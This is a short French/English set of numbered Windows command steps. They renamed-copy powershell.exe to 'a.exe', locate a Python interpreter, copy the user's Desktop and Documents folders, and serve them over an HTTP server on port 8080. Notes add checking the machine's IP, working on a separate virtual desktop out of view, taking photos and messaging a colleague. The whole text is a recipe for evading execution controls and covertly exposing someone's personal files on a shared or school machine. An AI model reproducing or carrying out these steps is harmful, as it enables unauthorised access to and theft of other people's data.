1- Ouvrir un cmd : (Il faut faire cela sur un autre bureau Windows Windows + flèche)
```powershell=
Windows + R : cmd
```

1.1- Copie du powershell
```powershell=
copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe a.exe
```

2- Find python (A ne pas faire en réel)
```powershell=
Get-ChildItem -Path C:\ -Filter *python.exe* -Recurse -File 2>$null
```

2.1- Get into the directory
```powershell=
cd ../../../EduPython/App
```

2.2- Copy Info from Desktop 
```powershell=
copy %USERPROFILE%\Desktop .

copy %USERPROFILE%\Documents .
```

3- Execute python server
```powershell=
.\python.exe -m http.server 8080 (prendre photo)
```

4- Get the IP from the station
```powershell=
ipconfig (envoyer message check)
```

---

* Il faut faire cela sur un autre bureau Windows 
* Vérifier l'IP de la machine 
* Prendre photos check
* Demandez par message à un collègue si ok
